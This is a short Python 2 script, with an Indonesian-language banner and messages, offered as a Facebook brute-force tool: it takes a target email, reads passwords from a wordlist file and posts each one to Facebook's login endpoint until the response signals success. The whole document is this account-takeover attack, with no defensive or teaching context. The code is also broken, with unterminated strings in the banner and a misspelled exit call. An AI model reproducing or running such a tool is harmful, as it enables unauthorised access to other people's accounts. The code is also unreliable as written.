import requests
import sys

print "\033[92m===================================
print "\033[92m==   BRUTE FORCE FACEBOOK v1.1   ==          
print "\033[92m===================================

print "\033[92m   [!] Pastikan Wordlist bernama pass.txt [!]

email = raw_input('email >')
url = 'https://free.facebook.com/login.php?login_attempt=1'
ex = open('pass.txt', 'r').readlines()

for line in ex:
    password = line.strip()
    http = requests.post(url, data={'email':email, 'pass':password, 'login':'submit'})
    content = http.content
    if "beranda" in content:
        print "\033[93m[+] BERHASIL! Mencoba Password",password
        sys.esit(1)
    else:
        print "\033[91m[-] GAGAL! Mencoba Password",password
